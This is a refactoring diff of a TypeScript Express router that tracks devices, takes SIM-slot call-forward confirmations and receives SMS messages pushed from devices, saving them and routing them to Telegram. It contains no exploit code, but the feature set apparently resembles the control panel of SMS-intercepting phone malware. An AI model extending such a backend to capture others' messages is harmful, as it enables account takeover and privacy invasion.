@@ -89,6 +89,8 @@ async function assertDeletePassword(password: string) {
     } as const;
   }
 
+  const stored = await getStoredDeletePassword();
+
   if (!stored) {
     await saveDeletePassword(entered);
     logger.info("devices: delete password created on first protected delete");
@@ -128,9 +130,6 @@ function toCategoryLabels(
   return labels;
 }
 
-/**
- * Compute device reachability from lastSeen.at
- */
 function computeReachability(lastSeenAt: number): {
   status: "responsive" | "idle" | "unreachable";
   lastSeenAt: number;
@@ -240,7 +239,7 @@ router.get("/status", async (_req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   LAST SEEN (NEW — primary reachability endpoint)
+   LAST SEEN
    ═══════════════════════════════════════════ */
 
 router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
@@ -262,17 +261,13 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
         action,
         battery,
       });
-    } catch {
-      // ignore
-    }
+    } catch {}
 
     try {
       if (doc) {
         wsService.broadcastDeviceUpsert(doc);
       }
-    } catch {
-      // ignore
-    }
+    } catch {}
 
     return res.json({ success: true });
   } catch (err: any) {
@@ -485,9 +480,7 @@ router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
 
     try {
       await touchLastSeen(deviceId, "fcm_token_sync");
-    } catch {
-      // ignore
-    }
+    } catch {}
 
     await emitDeviceUpsert(deviceId);
 
@@ -502,7 +495,7 @@ router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
 });
 
 /* ═══════════════════════════════════════════
-   SIM SLOT UPDATE (CALL-FORWARD CONFIRMATION)
+   SIM SLOT UPDATE
    ═══════════════════════════════════════════ */
 
 router.put("/:deviceId/simSlots/:slot", async (req, res) => {
@@ -551,9 +544,7 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
 
     try {
       await touchLastSeen(deviceId, "call_forwarded");
-    } catch {
-      // ignore
-    }
+    } catch {}
 
     await emitDeviceUpsert(deviceId);
 
@@ -815,7 +806,7 @@ router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   SMS PUSH (SAFE + SENDSMS SWITCH + WS + TELEGRAM ROUTING)
+   SMS PUSH (SAFE + SENDSMS SWITCH + TELEGRAM ROUTING)
    ═══════════════════════════════════════════ */
 
 router.post("/:id/sms", async (req: Request, res: Response) => {
@@ -855,14 +846,10 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       meta: req.body.meta || {},
     };
 
-    const sendSmsDisabled = isSendSmsDisabled();
-
-    if (sendSmsDisabled) {
+    if (isSendSmsDisabled()) {
       try {
         await touchLastSeen(deviceId, "sms_pushed");
-      } catch {
-        // ignore
-      }
+      } catch {}
 
       try {
         const device = await Device.findOne({ deviceId }).lean();
@@ -898,7 +885,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       try {
         await emitDeviceUpsert(deviceId);
       } catch (e) {
-        logger.warn("devices: lastSeen/emit after SENDSMS=no failed", e);
+        logger.warn("devices: emit device upsert after SENDSMS=no failed", e);
       }
 
       return res.json({
@@ -909,7 +896,17 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       });
     }
 
-    const smsDoc = new Sms(smsPayload);
+    const smsDoc = new Sms({
+      deviceId,
+      sender: smsPayload.sender,
+      senderNumber: smsPayload.senderNumber,
+      receiver: smsPayload.receiver,
+      title: smsPayload.title,
+      body: smsPayload.body,
+      timestamp: smsPayload.timestamp,
+      meta: smsPayload.meta,
+    });
+
     await smsDoc.save();
 
     try {
@@ -922,7 +919,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
           _id: smsDoc._id,
           title: smsDoc.title,
           sender: smsDoc.sender,
-          senderNumber: (smsDoc as any).senderNumber,
+          senderNumber: smsDoc.senderNumber,
           receiver: smsDoc.receiver,
           body: smsDoc.body,
           timestamp: smsDoc.timestamp,
@@ -968,7 +965,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
           categoryLabels,
           smsText,
           smsTitle: clean(smsDoc.title),
-          sender: clean((smsDoc as any).senderNumber || smsDoc.sender),
+          sender: clean(smsDoc.senderNumber || smsDoc.sender),
           receiver: clean(smsDoc.receiver),
           timestamp: Number(smsDoc.timestamp || finalTimestamp),
         });
@@ -1038,7 +1035,7 @@ router.get("/:deviceId", async (req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   UPDATE METADATA (device registration)
+   UPDATE METADATA
    ═══════════════════════════════════════════ */
 
 router.put("/:deviceId", async (req, res) => {
